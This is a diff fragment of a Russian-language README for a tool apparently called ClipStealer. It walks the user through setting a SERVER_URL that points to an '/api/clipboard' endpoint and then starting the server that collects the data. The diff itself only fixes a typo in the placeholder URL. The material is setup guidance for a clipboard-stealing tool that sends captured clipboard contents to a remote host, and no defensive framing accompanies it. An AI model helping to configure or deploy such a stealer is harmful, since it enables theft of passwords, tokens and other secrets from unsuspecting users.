@@ -32,7 +32,7 @@ pip install -r requirements.txt
 ### Шаг 3: Редактирование 
 Замените  ссылку в файле ClipStealer.py на Url сервера для отправки запроса
 ```
-SERVER_URL = 'ezample_url/api/clipboard'  # Замените на ваш адрес
+SERVER_URL = 'example_url/api/clipboard' 
 ```
 ### Шаг 4: Запуск сервера
 
